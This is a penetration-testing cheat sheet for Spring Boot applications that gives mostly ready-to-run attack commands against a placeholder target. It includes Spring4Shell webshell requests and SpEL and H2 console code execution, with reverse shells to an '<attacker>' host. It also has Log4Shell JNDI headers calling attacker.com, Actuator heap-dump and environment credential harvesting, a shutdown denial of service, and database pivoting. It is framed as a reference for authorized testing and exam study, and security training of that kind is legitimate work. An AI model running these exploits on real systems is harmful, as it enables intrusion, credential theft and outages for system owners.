# Spring Boot

> Java Spring Boot reference for penetration testing. Covers detection,
> enumeration, known CVEs, exploitation patterns, misconfigurations, and
> post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers

Spring Boot apps (embedded Tomcat / Jetty / Undertow) typically return:

```bash
curl -sI http://<TARGET>:8080/ | grep -iE '^(server|x-application-context|x-powered-by)'
```

Expected output:

```text
Server: Apache-Coyote/1.1
X-Application-Context: application:prod:8080
```

`X-Application-Context` is the strongest Spring Boot indicator. Format:

```text
X-Application-Context: <app-name>:<profile>:<port>
```

### Default error page

Spring Boot default error page (Whitelabel):

```json
{
  "timestamp": "2026-10-11T06:19:23.000+00:00",
  "status": 404,
  "error": "Not Found",
  "message": "No message available",
  "path": "/nonexistent"
}
```

Or the HTML Whitelabel page:

```html
<!doctype html>
<html lang="en">
<head>
  <title>Whitelabel Error Page</title>
  ...
  <h1>Whitelabel Error Page</h1>
  <p>This application has no explicit mapping for /error, so you are seeing this as a fallback.</p>
  ...
```

The Whitelabel Error Page is a strong Spring Boot signature.

### Actuator endpoints

Spring Boot Actuator (`spring-boot-starter-actuator`) exposes management
endpoints under `/actuator/`:

```bash
curl -s http://<TARGET>:8080/actuator
curl -s http://<TARGET>:8080/actuator/health
```

### Default port

Spring Boot default: `8080`. Actuator may be on a separate port:

```text
management.server.port=8081
management.endpoints.web.base-path=/actuator
```

### nmap / whatweb

```bash
nmap -sV -p 8080,8081,8443,9090 --script http-headers,http-title <TARGET>
whatweb -a 3 http://<TARGET>:8080/
```

---

## 2. Enumeration

### Actuator endpoints

Full list of Actuator endpoints (when exposed):

| Endpoint | Purpose | Sensitive |
|----------|---------|-----------|
| `/actuator` | Index of exposed endpoints | Yes |
| `/actuator/health` | App health | Low |
| `/actuator/info` | App info | Low |
| `/actuator/env` | Environment properties | **HIGH** |
| `/actuator/beans` | Spring beans | **HIGH** |
| `/actuator/configprops` | Config properties | **HIGH** |
| `/actuator/heapdump` | JVM heap dump (download) | **CRITICAL** |
| `/actuator/threaddump` | Thread dump | Medium |
| `/actuator/mappings` | All URL mappings | **HIGH** |
| `/actuator/loggers` | Log levels (changeable) | Medium |
| `/actuator/httptrace` | Last 100 HTTP requests | **HIGH** |
| `/actuator/auditevents` | Audit events | Medium |
| `/actuator/metrics` | Metrics | Low |
| `/actuator/prometheus` | Prometheus metrics | Low |
| `/actuator/scheduledtasks` | Scheduled tasks | Medium |
| `/actuator/caches` | Cache info (with delete) | Medium |
| `/actuator/shutdown` | **Shutdown app (POST)** | **CRITICAL** |
| `/actuator/sessions` | Session info | **HIGH** |
| `/actuator/features` | Feature flags | Low |
| `/actuator/refresh` | Refresh config (POST) | **CRITICAL** |

Fast enumeration:

```bash
for ep in health info env beans configprops heapdump threaddump mappings \
          loggers httptrace auditevents metrics prometheus scheduledtasks \
          caches shutdown sessions features refresh; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:8080/actuator/$ep")
  echo "$code  /actuator/$ep"
done
```

### /actuator/env - environment leak

The goldmine. Reveals:

- Environment variables (DB passwords, API keys, JWT secrets)
- `application.properties` / `application.yml` values
- System properties (Java version, OS, user)
- Command-line args (`--spring.datasource.password=...`)

```bash
curl -s http://<TARGET>:8080/actuator/env | jq .
curl -s http://<TARGET>:8080/actuator/env | jq '.propertySources[].properties' | grep -iE 'password|secret|key|token'
```

Individual property lookup:

```bash
curl -s "http://<TARGET>:8080/actuator/env/spring.datasource.password" | jq .
```

### /actuator/heapdump

A JVM heap dump (`.hprof` binary) containing **everything in memory**:

- Session tokens
- Passwords (in transit or cached)
- DB connection strings
- JWT signing keys
- Plaintext of TLS-decrypted secrets

```bash
curl -s http://<TARGET>:8080/actuator/heapdump -o heapdump.hprof
# Analyze with Eclipse MAT or:
strings heapdump.hprof | grep -iE 'password|secret|jwt|token' | head -20
```

With `jvisualvm` / `Eclipse Memory Analyzer`, this leads directly to
credentials or session hijacking.

### /actuator/mappings

Full route table:

```bash
curl -s http://<TARGET>:8080/actuator/mappings | jq '..|.dispatcherServlets? // empty'
```

Reveals all `@RequestMapping` paths, including hidden admin / debug endpoints.

### /actuator/httptrace

Recent HTTP requests (URLs, headers, session IDs):

```bash
curl -s http://<TARGET>:8080/actuator/httptrace | jq .
```

May capture: Authorization headers, JSESSIONID, API keys in query strings.

### /actuator/loggers - change log level

POST to enable DEBUG logging at runtime:

```bash
curl -X POST http://<TARGET>:8080/actuator/loggers/com.example \
  -H "Content-Type: application/json" \
  -d '{"configuredLevel":"DEBUG"}'
```

Then watch `/actuator/httptrace` for verbose stack traces + secrets.

### Common Spring paths

```bash
for p in / /actuator /swagger-ui.html /swagger-ui/ /v2/api-docs /v3/api-docs \
         /api /api/v1 /login /logout /h2-console /console /jolokia \
         /management /admin /error; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:8080$p")
  echo "$code  $p"
done
```

### Swagger / OpenAPI

```bash
curl -s http://<TARGET>:8080/v2/api-docs | jq .
curl -s http://<TARGET>:8080/v3/api-docs | jq .
curl -s http://<TARGET>:8080/swagger-ui.html
```

Full API documentation (paths, methods, params).

### H2 console

Spring Boot dev with H2 database exposes `/h2-console`:

```bash
curl -s http://<TARGET>:8080/h2-console/ | grep -iE 'h2|jdbc'
```

Default H2 JDBC URL: `jdbc:h2:mem:testdb`. Connect with `sa` / empty password.

### Jolokia (JMX over HTTP)

If `jolokia` is included:

```bash
curl -s http://<TARGET>:8080/jolokia/list | jq .
```

Jolokia allows arbitrary MBean operations -> RCE (see section 4).

### Directory brute force

```bash
feroxbuster -u http://<TARGET>:8080/ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
```

Seclists has a `spring-boot.txt` wordlist:

```bash
curl -s http://<TARGET>:8080/actuator | jq -r '. _links | keys[]'
```

Parse `/actuator` JSON to auto-discover exposed endpoints.

---

## 3. Known CVEs

### CVE-2022-22965 - Spring4Shell (RCE)

Data binding vulnerability in Spring Framework on JDK 9+ running on Tomcat.
Allows modification of `class.module.classLoader.*` -> write JSP webshell.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-22965
Affected: Spring Framework < 5.3.18, < 5.2.20.

PoC:

```bash
# 1. Modify Tomcat logging config to write to webapps/ROOT/shell.jsp
curl -X POST http://<TARGET>:8080/ \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{prefix}i%25{ suffix }i" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

# 2. Send the JSP payload in headers
curl http://<TARGET>:8080/ \
  -H "prefix: <%25" \
  -H "suffix: %25>" \
  -H "c: Runtime.getRuntime().exec(request.getParameter(\"cmd\"))"

# 3. Trigger
curl "http://<TARGET>:8080/shell.jsp?cmd=id"
```

Metasploit: `exploit/multi/http/spring_framework_rce_spring4shell`.

### CVE-2022-22963 - Spring Cloud Function SpEL injection (RCE)

`spring.cloud.function.routing-expression` header is evaluated as SpEL ->
arbitrary code execution.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-22963
Affected: Spring Cloud Function 3.0.0 - 3.2.2.

PoC:

```bash
curl -X POST http://<TARGET>:8080/functionRouter \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})" \
  -H "Content-Type: text/plain" \
  -d "test"
```

### CVE-2022-22947 - Spring Cloud Gateway SpEL injection (RCE)

Actuator endpoint `/actuator/gateway/routes` allows adding a route with
SpEL expression -> RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-22947
Affected: Spring Cloud Gateway < 3.1.1, < 3.0.7.

PoC:

```bash
# 1. Add a malicious route
curl -X POST http://<TARGET>:8080/actuator/gateway/routes/hacktest \
  -H "Content-Type: application/json" \
  -d '{
    "id": "hacktest",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
      }
    }],
    "uri": "http://example.com",
    "order": 0
  }'

# 2. Refresh routes
curl -X POST http://<TARGET>:8080/actuator/gateway/refresh

# 3. Trigger
curl http://<TARGET>:8080/actuator/gateway/routes/hacktest
```

### CVE-2023-34034 / CVE-2023-34035 - Spring Security auth bypass

- CVE-2023-34034: `**` wildcard matching bypass -> auth bypass
- CVE-2023-34035: Bypass via crafted request to servlet path

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-34034
NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-34035
Affected: Spring Security 5.8.4 and earlier, 6.0.4 and earlier.

### CVE-2023-20860 - Spring Security auth bypass

`AuthorizationManager` misconfiguration with `anyRequest().authenticated()`
can be bypassed via path trickery.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-20860
Affected: Spring Framework 6.0.0 - 6.0.6, 5.3.0 - 5.3.25.

### CVE-2024-22243 / CVE-2024-22259 - URL parsing SSRF

`UriComponentsBuilder` mishandles URLs with `@` in user-info -> SSRF /
open redirect.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-22243
NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-22259
Affected: Spring Framework 6.1.0 - 6.1.3, 6.0.0 - 6.0.16, 5.3.0 - 5.3.31.

### CVE-2024-38816 / CVE-2024-38819 - Path traversal in WebFlux / WebMvc

Crafted URLs with encoded path traversal -> file read.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-38816
NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-38819
Affected: Spring Framework 5.3.0 - 5.3.39, 6.0.0 - 6.0.23, 6.1.0 - 6.1.12.

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| < 5.3.18, < 5.2.20 | Spring4Shell RCE | CVE-2022-22965 |
| Spring Cloud Function 3.0-3.2.2 | SpEL RCE | CVE-2022-22963 |
| Spring Cloud Gateway < 3.1.1 | SpEL RCE | CVE-2022-22947 |
| Spring Security <= 5.8.4 / 6.0.4 | Auth bypass | CVE-2023-34034 / 34035 |
| Spring Framework 6.0-6.1 | URL SSRF | CVE-2024-22243 / 22259 |
| Spring Framework 5.3-6.1 | Path traversal | CVE-2024-38816 / 38819 |

---

## 4. Exploitation Patterns

### Spring4Shell (CVE-2022-22965)

Requires:
- Spring MVC / WebFlux
- JDK 9+
- Deployed as WAR on Tomcat
- Vulnerable Spring version

```bash
# Automated
git clone https://github.com/reznok/Spring4Shell-POC.git
cd Spring4Shell-POC
python exploit.py --url http://<TARGET>:8080/
```

Metasploit:

```text
use exploit/multi/http/spring_framework_rce_spring4shell
set RHOSTS <target>
set RPORT 8080
set LHOST <your ip>
run
```

### Spring Cloud Function SpEL (CVE-2022-22963)

```bash
curl -X POST http://<TARGET>:8080/functionRouter \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"id\"})" \
  -H "Content-Type: text/plain" \
  -d "test"

# Reverse shell
curl -X POST http://<TARGET>:8080/functionRouter \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/<attacker>/4444 0>&1\"})" \
  -d "test"
```

### Spring Cloud Gateway SpEL (CVE-2022-22947)

See section 3. This requires `/actuator/gateway/*` endpoints exposed.

### Actuator env + heapdump -> credentials

Step 1: dump env

```bash
curl -s http://<TARGET>:8080/actuator/env | jq '.propertySources[] | {name, props: .properties | keys}' | head -40
```

Step 2: dump heap

```bash
curl -s http://<TARGET>:8080/actuator/heapdump -o heap.hprof
# Analyze with MAT or grep for strings
strings heap.hprof | grep -iE '(password|secret|token|api[_-]?key)=' | sort -u | head -30
```

Extract session tokens, cached passwords.

### Actuator /shutdown -> DoS

```bash
curl -X POST http://<TARGET>:8080/actuator/shutdown
```

Only works if `management.endpoint.shutdown.enabled=true` (disabled by default).

### Jolokia -> RCE

If Jolokia is exposed and MBeans include `logback` (very common), use the
Logback JNDI / config reload trick:

```bash
# 1. Exfiltrate a config file via logback MBean
curl -X POST http://<TARGET>:8080/jolokia/ \
  -H "Content-Type: application/json" \
  -d '{"type":"exec","mbean":"ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.joran.JoranConfigurator","operation":"doConfigure","arguments":["http://<attacker>/malicious.xml"]}'
```

`malicious.xml` (logback config) triggers JNDI lookup -> RCE.

Alternative: use `com.sun.management:type=DiagnosticCommand` MBean with
`jvmtiAgentLoad` (or `vmCommand`) -> load a native agent.

### Actuator loggers -> enable verbose logging

```bash
curl -X POST http://<TARGET>:8080/actuator/loggers/ROOT \
  -H "Content-Type: application/json" \
  -d '{"configuredLevel":"TRACE"}'
```

Now all requests log in detail -> watch `/actuator/httptrace` for credentials.

### SpEL injection in parameters

If user input reaches SpEL evaluation:

```bash
curl "http://<TARGET>:8080/calc?expr=T(java.lang.Runtime).getRuntime().exec('id')"
```

SpEL syntax (same as Spring Cloud Function CVE):

```text
T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})
T(java.lang.Runtime).getRuntime().exec("bash -c {echo,BASE64}|{base64,-d}|bash")
```

### H2 console -> RCE

If `/h2-console` is exposed (dev mode):

1. Connect with JDBC URL: `jdbc:h2:mem:testdb` and user `sa`, no password.
2. Execute arbitrary SQL.
3. H2 supports `CREATE ALIAS ... FOR "java.lang.Runtime.exec"` -> Java RCE:

```sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {
  java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
  return s.hasNext() ? s.next() : "";
}';
CALL EXEC('id');
CALL EXEC('bash -i >& /dev/tcp/<attacker>/4444 0>&1');
```

### Swagger -> discover hidden endpoints

```bash
curl -s http://<TARGET>:8080/v3/api-docs | jq '.paths | keys[]'
```

Look for `/admin/*`, `/internal/*`, `/debug/*`, `/test/*` endpoints.

### Log4Shell (transitive)

Spring Boot apps using Log4j 2.x < 2.17.0 are vulnerable to Log4Shell:

```bash
curl -H "X-Api-Version: ${jndi:ldap://attacker.com/a}" http://<TARGET>:8080/
curl -H "User-Agent: ${jndi:ldap://attacker.com/a}" http://<TARGET>:8080/
```

See CVE-2021-44228 (NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

---

## 5. Misconfigurations

### Actuator endpoints exposed

```bash
curl -s http://<TARGET>:8080/actuator | jq '._links | keys'
```

Exposed `env`, `heapdump`, `mappings`, `shutdown` are critical.

### No auth on actuator

By default, Actuator is unauthenticated. Only Spring Security integration
protects it. Check:

```bash
curl -s http://<TARGET>:8080/actuator/env | head -c 200
```

If 200 -> exposed.

### `/actuator/env` shows raw passwords

```bash
curl -s http://<TARGET>:8080/actuator/env | jq '.propertySources[] | select(.name | test("application")) | .properties | to_entries[] | select(.key | test("password|secret|key"))'
```

### `/actuator/heapdump` publicly downloadable

```bash
curl -sI http://<TARGET>:8080/actuator/heapdump | grep -iE 'content-length|content-type'
```

If 200 with `application/octet-stream` -> dump is downloadable.

### H2 console in production

```bash
curl -s http://<TARGET>:8080/h2-console/ | grep -i 'h2 console'
```

### Swagger in production

```bash
curl -s http://<TARGET>:8080/swagger-ui.html | grep -i swagger
```

Reveals entire API surface including internal endpoints.

### Default Basic auth credentials

Spring Security `InMemoryUserDetailsManager` with hardcoded creds:

```bash
curl -u admin:admin http://<TARGET>:8080/actuator/env
curl -u user:password http://<TARGET>:8080/actuator/env
```

### Debug / trace enabled globally

```bash
curl -s http://<TARGET>:8080/actuator/loggers/ROOT | jq .
```

If `configuredLevel: DEBUG` and httptrace is on, credentials are logged.

### Exposed application.yml / properties

```bash
for f in application.yml application.properties application-prod.yml application-prod.properties bootstrap.yml; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:8080/$f")
  echo "$code  $f"
done
```

### CORS misconfig

```bash
curl -sI -H "Origin: https://evil.com" http://<TARGET>:8080/api/ | grep -i 'access-control'
```

---

## 6. Post-Exploitation

### Config file locations

| Layout | Path |
|--------|------|
| JAR | Inside `BOOT-INF/classes/application.properties` |
| JAR | Inside `BOOT-INF/classes/application.yml` |
| WAR | Inside `WEB-INF/classes/application.yml` |
| Exploded | `<app>/config/`, `<app>/application.yml` |
| External | `/etc/myapp/application.yml` |
| Env override | `systemctl show myapp --property=Environment` |

### Extract config from JAR

```bash
# Unzip the JAR
unzip -l app.jar | grep -E 'application|bootstrap'
unzip -p app.jar BOOT-INF/classes/application.properties
unzip -p app.jar BOOT-INF/classes/application.yml
```

Or use `jd-cli` / `cfr` to decompile and view.

### What to look for

```bash
grep -rE 'password|secret|key|token|jdbc|mongodb://|redis://' /opt/myapp/ 2>/dev/null
find / -name 'application*.yml' -o -name 'application*.properties' 2>/dev/null
```

Key items:

- `spring.datasource.url` + `spring.datasource.username` + `spring.datasource.password`
- `spring.redis.host` / `spring.redis.password`
- `spring.kafka.bootstrap-servers` + SASL creds
- `spring.mail.*` -> SMTP creds
- `jwt.secret` / `jwt.signing.key` -> forge JWTs
- `aws.accessKeyId` / `aws.secretAccessKey`
- `management.endpoints.web.exposure.include=*` -> all actuator endpoints open

### JAR decompilation

```bash
# Decompile the whole app
java -jar cfr.jar app.jar --outputdir ./decompiled/
grep -rE 'password|secret|key' ./decompiled/ | head -30
```

Look for hardcoded credentials, debug flags, backdoors.

### Heap dump analysis

From `/actuator/heapdump` (if not yet downloaded):

```bash
curl -s http://<TARGET>:8080/actuator/heapdump -o heap.hprof
# Eclipse MAT
mat heap.hprof
# Or quick grep:
strings heap.hprof | grep -iE 'password|secret|token|jwt|bearer' | sort -u | head -50
```

Session IDs, decrypted passwords, in-flight API tokens.

### JVM process injection (root)

If you have root on the host:

```bash
jcmd <pid> VM.system_properties
jcmd <pid> VM.command_line
jcmd <pid> GC.class_histogram
```

Attach a Java agent:

```bash
# Compile a simple agent that runs a command on attach
jcmd <pid> JVMTI.agent_load /path/to/agent.so
```

### Spring Boot `/actuator/shutdown` for cleanup

```bash
curl -X POST http://<TARGET>:8080/actuator/shutdown
```

Only after you have documented proof. Restart is needed for the app.

### Data source credentials -> DB pivot

From `spring.datasource.*`:

```bash
psql -h <host> -U <user> -d <db>
# Or:
mysql -h <host> -u <user> -p<password> <db>
```

Spring Boot typically uses HikariCP; the underlying DB user has broad rights.

### Logs

```bash
ls -la /opt/myapp/logs/ /var/log/myapp/ 2>/dev/null
tail -n 200 /opt/myapp/logs/application.log
```

Spring Boot logs may contain: SQL queries, exceptions with parameters,
authorization tokens, session IDs.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the `X-Application-Context` header AND the Whitelabel Error Page - together they identify Spring Boot.

> [!IMPORTANT]
> OSCP report: for Spring4Shell, screenshot the malicious POST body AND the resulting webshell output (`id` in JSP).

> [!IMPORTANT]
> OSCP report: for actuator env leak, screenshot the JSON showing `spring.datasource.password` (mask it in the report, but capture the key path).

---

## 8. References

- Spring Boot official docs: https://spring.io/projects/spring-boot
- Spring Security advisories: https://spring.io/security
- NVD search: https://nvd.nist.gov/vuln/search/results?query=spring+boot
- Spring4Shell writeup: https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
- Spring Cloud Gateway RCE: https://wya.pl/2022/02/26/cve-2022-22947-spel-cve/
- Actuator security: https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html
- HackTricks - Spring: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators
- CFRS (JAR decompiler): https://www.benf.org/other/cfr/

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*